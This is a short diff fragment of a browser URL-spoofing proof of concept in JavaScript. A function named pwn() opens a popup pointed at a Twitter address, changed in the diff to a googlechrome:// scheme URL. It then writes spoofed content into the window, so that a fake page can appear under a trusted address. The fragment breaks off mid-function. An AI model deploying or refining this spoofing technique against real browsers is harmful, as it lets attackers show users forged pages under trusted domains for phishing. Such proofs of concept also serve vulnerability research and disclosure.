@@ -1,7 +1,7 @@
 
 	<script>
 	    function pwn() {
-	        v = setInterval(`x=window.open('https://www.twitter.com:1234','test', 'width=400 height=300')`);
+	        v = setInterval(`x=window.open('googlechrome://twitter.com:1234','test', 'width=400 height=300')`);
 	        i = setInterval(`
 	            x.document.write("<h1>url spoofing...</h1>");
 	            clearInterval(v);
